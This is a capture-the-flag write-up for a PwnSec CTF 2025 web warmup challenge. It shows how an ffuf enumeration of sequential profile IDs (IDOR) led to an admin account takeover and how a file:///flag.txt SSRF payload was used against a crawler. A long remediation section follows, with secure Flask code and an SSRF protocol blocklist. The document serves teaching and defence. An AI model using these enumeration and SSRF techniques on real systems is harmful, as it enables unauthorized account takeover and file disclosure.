# PwnSec CTF 2025

# Warmup

## Web: IDOR

## Description
Just a normal warmup challenge here is the guest creds guest:guest123 the flag is in /flag.txt
- @qlashx

## Files
> This challenge did not provide files, only the description.

---

## Analysis

Upon entering the web application, we're given credentials **guest:guest123**. After logging in, we see a dashboard and a profile section showing we have ID 1, along with a password change feature. We notice that the ID in the URL is a simple integer (1, 2, etc.) rather than a session token or complex identifier. Knowing this, we need to find the admin account and change their password.

## Theory

To solve this challenge you need to understand:
- **IDOR (Insecure Direct Object Reference)**
- **Fuzzing**
- **SSRF (Server-Side Request Forgery)**
- **Patience** ;)

---

## Solution

### Step 1: Intercepting the Request

As a first step, since we identified this as an IDOR vulnerability, we need to intercept the request with Burp Suite and capture the headers and session cookies to use them with curl for fuzzing.

We take the credentials and since we'll use them in the terminal, we need to format them as headers with the `-H` flag:

```bash
-H "Cookie: session=.eJyrVirKz0lVslJKL00tLlHSUSotTi2Kz0xRsjKEsPMScxHStQB4NA_R.aRjUrw.GPw_Sgl3ACDCvtwMIcwWQ9kj34M" \

-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" \

-H "Referer: https://52c7ad47cd52fee3.chal.ctf.ae/dashboard"
```

### Step 2: Creating a Wordlist

Since this is an IDOR vulnerability, we can't manually test every number one by one. We need to create a simple Python script to generate a dictionary of numbers. In this case, I programmed it to go up to 1000:

```python
for i in range(1, 1001):
    print(i)
```

Instead of using libraries to export to a text file, we leverage the power of Linux/bash and redirect the output to a text file. In this case, my script is called **do_dic.py**:

```bash
python do_dic.py > numbers.txt
```

With this, we have a comprehensive dictionary and can start **fuzzing**. We'll use a tool called ffuf to fuzz and test all these numbers until we find the admin:

```bash
ffuf -w numbers.txt -u https://52c7ad47cd52fee3.chal.ctf.ae/profile/FUZZ \
    -H "Cookie: session=.eJyrVirKz0lVslJKL00tLlHSUSotTi2Kz0xRsjKEsPMScxHStQB4NA_R.aRjUrw.GPw_Sgl3ACDCvtwMIcwWQ9kj34M" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" \
    -H "Referer: https://52c7ad47cd52fee3.chal.ctf.ae/dashboard" \
    -mc 200
```

This command produces the following output:

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://52c7ad47cd52fee3.chal.ctf.ae/profile/FUZZ
 :: Wordlist         : FUZZ: /home/p34nut/Hacking/PwnSec/warmup/numbers.txt
 :: Header           : Cookie: session=.eJyrVirKz0lVslJKL00tLlHSUSotTi2Kz0xRsjKEsPMScxHStQB4NA_R.aRjUrw.GPw_Sgl3ACDCvtwMIcwWQ9kj34M
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
 :: Header           : Referer: https://52c7ad47cd52fee3.chal.ctf.ae/dashboard
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

1                       [Status: 200, Size: 7255, Words: 2935, Lines: 290, Duration: 112ms]
8                       [Status: 200, Size: 7428, Words: 2983, Lines: 294, Duration: 104ms]
:: Progress: [1000/1000] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

### Step 3: Exploiting the Admin Account

Once we have the numbers (IDs or directories), we can see there's ID 8. We test it and confirm it belongs to the admin. With this information, we quickly navigate to the password change feature and set a new password. Once done, we log in with the admin credentials and find an admin panel with a crawler or spider.

We notice it doesn't accept localhost or IP addresses, so DNS rebinding won't work. We remember SSRF and notice the crawler seems to only block on the client-side, which is incorrect. We exploit this using:

```
file:///flag.txt
```

**MACHINE PWNED!** :)

---

## Flag

In this case, I don't have the exact flag because I forgot to note it down. The flag appears to be random and I couldn't recreate the instance, so here's proof of completion:

> <img width="657" height="767" alt="flag_prove" src="https://github.com/user-attachments/assets/569e06b3-7279-4ede-a058-29d4088dc19c" />


---

## How to avoid

To prevent **IDOR (Insecure Direct Object Reference)** and **SSRF (Server-Side Request Forgery)** attacks like this, implement the following security measures:

### 1. **Implement Proper Authorization Checks**
- **Never** rely solely on sequential IDs for access control
- Implement authorization checks on every request that accesses resources
- Verify that the authenticated user has permission to access the requested resource
- Use the principle: "Does this user have permission to access THIS specific resource?"

```python
from flask import Flask, session, abort
from functools import wraps

def check_profile_access(f):
    @wraps(f)
    def decorated_function(profile_id, *args, **kwargs):
        # Check if user is accessing their own profile or is admin
        if session.get('user_id') != profile_id and not session.get('is_admin'):
            abort(403)  # Forbidden
        return f(profile_id, *args, **kwargs)
    return decorated_function

@app.route('/profile/<int:profile_id>')
@check_profile_access
def view_profile(profile_id):
    # User is authorized to view this profile
    profile = get_profile(profile_id)
    return render_template('profile.html', profile=profile)
```

### 2. **Use Non-Sequential, Unpredictable Identifiers**
- Replace sequential integers (1, 2, 3...) with UUIDs or cryptographically random tokens
- Make resource identifiers difficult to guess or enumerate
- Consider using HMACs or signed tokens for sensitive resources

```python
import uuid
from werkzeug.security import generate_password_hash

class User:
    def __init__(self, username):
        # Use UUID instead of auto-incrementing ID
        self.public_id = str(uuid.uuid4())
        self.username = username
        self.internal_id = None  # Keep internal ID private

# URL would look like: /profile/550e8400-e29b-41d4-a716-446655440000
# Instead of: /profile/8
```

### 3. **Implement SSRF Protection**
- **Validate and sanitize all URLs** before making server-side requests
- Use strict allowlists for protocols (only allow http/https)
- Block access to internal/private IP ranges
- Disable dangerous protocols like `file://`, `gopher://`, `dict://`, etc.

```python
import ipaddress
from urllib.parse import urlparse

# Dangerous protocols that should be blocked
BLOCKED_PROTOCOLS = ['file', 'gopher', 'dict', 'ftp', 'jar', 'ldap', 'tftp']

# Private IP ranges to block
PRIVATE_RANGES = [
    ipaddress.IPv4Network('10.0.0.0/8'),
    ipaddress.IPv4Network('172.16.0.0/12'),
    ipaddress.IPv4Network('192.168.0.0/16'),
    ipaddress.IPv4Network('127.0.0.0/8'),
    ipaddress.IPv4Network('169.254.0.0/16'),
]

def is_safe_url(url):
    """Validate URL to prevent SSRF attacks"""
    try:
        parsed = urlparse(url)
        
        # Check protocol
        if parsed.scheme.lower() in BLOCKED_PROTOCOLS:
            return False
        
        # Only allow http/https
        if parsed.scheme.lower() not in ['http', 'https']:
            return False
        
        # Resolve hostname to IP
        hostname = parsed.hostname
        if not hostname:
            return False
            
        # Block localhost variations
        if hostname.lower() in ['localhost', '0.0.0.0', '[::]']:
            return False
        
        # Check if IP is in private range
        try:
            ip = ipaddress.ip_address(hostname)
            for private_range in PRIVATE_RANGES:
                if ip in private_range:
                    return False
        except ValueError:
            # It's a domain name, resolve it
            import socket
            try:
                ip_str = socket.gethostbyname(hostname)
                ip = ipaddress.ip_address(ip_str)
                for private_range in PRIVATE_RANGES:
                    if ip in private_range:
                        return False
            except socket.gaierror:
                return False
        
        return True
    except Exception:
        return False

@app.route('/crawler', methods=['POST'])
def crawl():
    url = request.form.get('url', '')
    
    if not is_safe_url(url):
        return "Invalid URL: potential SSRF detected", 400
    
    # Safe to proceed with request
    response = requests.get(url, timeout=5)
    return response.text
```

### 4. **Implement Rate Limiting and Monitoring**
- Detect and block automated enumeration attempts
- Monitor for suspicious access patterns (sequential ID probing)
- Implement exponential backoff for failed authorization attempts

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/profile/<int:profile_id>')
@limiter.limit("10 per minute")
@check_profile_access
def view_profile(profile_id):
    # Rate limited endpoint
    pass
```

### 5. **Server-Side Validation Only**
- **Never rely on client-side validation** for security
- All security checks must be performed on the server
- Client-side checks are only for UX improvement

### 6. **Use Content Security Policy (CSP)**
```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; connect-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response
```

### 7. **Implement Proper Session Management**
- Use secure, httpOnly cookies for session tokens
- Implement proper session timeout
- Regenerate session IDs after privilege changes

```python
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)
)
```

### Example Secure Implementation:

**Vulnerable Code:**
```python
@app.route('/profile/<int:user_id>')
def view_profile(user_id):
    # VULNERABLE: No authorization check
    profile = db.get_profile(user_id)
    return render_template('profile.html', profile=profile)

@app.route('/crawler', methods=['POST'])
def crawl():
    url = request.form.get('url')
    # VULNERABLE: No URL validation
    response = requests.get(url)
    return response.text
```

**Secure Code:**
```python
import uuid
import ipaddress
from functools import wraps
from urllib.parse import urlparse

def require_auth(f):
    @wraps(f)
    def decorated_function(profile_uuid, *args, **kwargs):
        # Get current user from session
        current_user_uuid = session.get('user_uuid')
        
        # Check if user is accessing their own profile or is admin
        if current_user_uuid != profile_uuid and not session.get('is_admin'):
            abort(403)
        
        return f(profile_uuid, *args, **kwargs)
    return decorated_function

@app.route('/profile/<uuid:profile_uuid>')
@require_auth
def view_profile(profile_uuid):
    # Authorization checked by decorator
    profile = db.get_profile_by_uuid(str(profile_uuid))
    if not profile:
        abort(404)
    return render_template('profile.html', profile=profile)

@app.route('/crawler', methods=['POST'])
@limiter.limit("5 per minute")
def crawl():
    url = request.form.get('url', '')
    
    # Validate URL
    if not is_safe_url(url):
        return jsonify({"error": "Invalid or unsafe URL"}), 400
    
    try:
        response = requests.get(
            url,
            timeout=5,
            allow_redirects=False  # Prevent redirect-based bypasses
        )
        return response.text
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Failed to fetch URL"}), 500
```

### References:
- [OWASP: Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Cheat Sheet: SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
